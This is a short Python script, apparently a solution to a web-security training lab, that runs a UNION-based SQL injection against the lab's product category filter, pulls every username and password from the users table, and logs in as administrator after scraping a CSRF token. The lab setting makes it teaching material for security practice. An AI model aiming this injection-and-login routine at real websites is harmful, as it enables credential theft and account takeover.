#!/usr/bin/env python

"""This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user."""

# Vulnerable query = '+UNION+SELECT+username,password+FROM+users--

import requests
from bs4 import BeautifulSoup
import sys

s = requests.session()
lab_id = '0a7900330406ba82c045aa4100b000a8' #change based on generated lab page id

def getCreds(query: str) -> dict:
    d = {}
    uri = f"https://{lab_id}.web-security-academy.net/filter?category={query}"
    r = requests.get(uri)
    parse = BeautifulSoup(r.text, 'lxml')
    for tr in parse.findAll('tr'):
        key = tr.text.split()[0]
        value = tr.text.split()[1]
        d[key] = value
    if not d == {}:
        print(f"Found query results: {d}")
        return d
    else:
        print("Nothing found. Check query")
        sys.exit(-1)


def login(username: str,password: str) -> None:
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    parse = BeautifulSoup(r.text, 'lxml')
    token = parse.find('input', {'name': 'csrf'})['value'] #csrf token

    data = { 'username' : username,
        'password' : password,
        'csrf': token
    }

    print(f"Attempting to login with user: {username}")
    r2 = s.post(uri, data=data)
    if "Your username is: administrator" in r2.text:
        print("solved")
    else:
        print("nope")


def main() -> None:
    sqli_query = "'+UNION+SELECT+username,password+FROM+users--"
    results = getCreds(sqli_query)
    login('administrator',results['administrator'])


if __name__ == "__main__":
    main()



